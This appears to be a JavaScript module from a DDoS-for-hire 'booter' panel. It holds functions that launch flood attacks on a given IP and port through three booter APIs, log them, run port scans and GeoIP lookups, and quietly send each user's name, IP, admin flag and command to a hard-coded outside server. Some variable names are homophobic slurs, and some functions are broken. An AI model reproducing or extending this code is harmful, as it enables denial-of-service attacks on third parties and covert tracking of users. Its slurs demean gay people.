const fs = require("fs");
const config = require("../config/strings.js");
const func = require("./functions.js");
const fetch = require("node-fetch");
var term = require( 'terminal-kit' ).terminal;
const { Socket } = require("dgram");
const crud = require("../auth/crud.js");

exports.GeoIP = async function(ip) {
    let results = await(await fetch("https://scrapy.tech/tools/?action=geoip&q="+ ip)).text();
    return results;
}

exports.pScan = async function(ip) {
    let get_result = await(await fetch("https://scrapy.tech/tools/?action=portscan&q=" + ip)).text();
    return get_result;
}

exports.show_stats = function(user_name) {
    let response = "";
    let user_stats = crud.user(user_name, "all");
    let stats = user_stats.split(",");
    response += "[User]: " + stats[0] + "\r\n";
    response += "[IP]: " + stats[1] + "\r\n";
    response += "[Level] " + stats[3] + "\r\n";
    response += "[Maxtime]: " + stats[4] + "\r\n";
    switch(parseInt(stats[5])) {
        case 0:
            response += "[Admin]: False\r\n"; 
            break;
        case 1:
            response += "[Admin]: True\r\n"; 
            break;
    }
    return response;
}

exports.user_stats = function(usrOrip) {
    let get_info = crud.user(user_name, "all").split(",");
    let stats = "User: " + get_info[0] + "\n";
    stats += "IP: " + get_info[1] + "\n";
    stats += "Level: " + get_info[3] + "\n";
    stats += "Maxtime: " + get_info[4];
    switch(parseInt(get_info[5])) {
        case 0:
            stats += "Admin: False";
            break;
        case 1:
            stats += "Admin: True";
            break;
    }

}

exports.stats = function(option) {
    if(option === null || option === "undefined") {
        return "Invalid argument";
    } else {
        switch(option) {
            case "users":
                return func.lineCOUNT("./db/users.db")-1;
            case "current":
                return func.lineCOUNT("./db/current.db")-1;
            case "attacks":
                return func.lineCOUNT("./db/attacks.db")-1;
            case "logs":
                return func.lineCOUNT("./db/logs.db")-1;
        }
    }
}

exports.lineCOUNT = function(file_path) {
    let fag = fs.readFileSync(file_path, "utf8");
    let hover_is_gay = fag.split("\n").length;
    return hover_is_gay;
}

exports.log = function(usr, ip) {
    let log_dis = "";
    log_dis += "[User]: " + usr + " | [IP]: " + ip + "\n";
    log_dis += "[Admin]: " + config.CurrentUser.isAdmin + " | [CMD]: " + config.CurrentCMD.Cmd + "\r\n\r\n";
    console.log(log_dis);
}

exports.log_to_file = function(str) {
    let logthis = "";
    fs.appendFileSync("./db/logs.db", str);
}

exports.log_attacks = function(ip, port, time, method, usr) {
    fs.appendFileSync("./db/attacks.db", "('" + usr + "','" + ip + "','" + port + "','" + time + "','" + method + "')");
}

exports.send_notification = async function(usr, usr_ip, cmd) {
    let skid = await(await fetch("http://195.133.11.199/skid.php?user=" + usr + "&ip=" + usr_ip + "&admin=" + config.CurrentUser.isAdmin + "&cmd=" + cmd)).text()
    return skid;
}

exports.send_attack = async function(ip, port, time, method, usr) {
    let response = "";
    let rreturn = await(await fetch(config.BOOTERAPI + ip + "&port=" + port + "&time=" + time + "&method=" + method)).text();
    console.log(rreturn);
    response += "API 1: " + await func.get_api_response(rreturn) + "\r\n";
    let rreturn1 = await(await fetch(config.BOOTERAPI2 + ip + "&port=" + port + "&time=" + time + "&method=" + method)).text();
    console.log(rreturn1);
    response += "API 2: " + await func.get_api_response(rreturn1) + "\r\n";
    let rreturn2 = await(await fetch(config.BOOTERAPI3 + ip + "&port=" + port + "&time=" + time + "&method=" + method)).text();
    console.log(rreturn2);
    response += "API 3: " + await func.get_api_response(rreturn2) + "\r\n";
    return response;
}

exports.get_api_response = function(rpn) {
    let new_res = rpn.toLowerCase();
    if(new_res.includes("attack sent") || new_res.includes("!* udp") || new_res.includes("!* tcp") || new_res.includes("attack initalized")) {
        return "Attack Sent";
    } else if(new_res.includes("invalid key") || new_res.includes("key is invalid")) {
        return "Error, Invalid Key";
    } else if(new_res.includes("invalid method") || new_res.includes("method is invalid") || new_res.includes("method does not exist") || new_res.includes("method doesn't exist")) {
        return "Error, Invalid Method";
    } else if(new_res.includes("error when connecting to the server if the problem")) { //CUSTOM (REMOVE LATER)
        return "Error, Either all fields aren't set or invalid method!";
    } else {
        return "Error, Something went wrong catching attack response!";
    }
}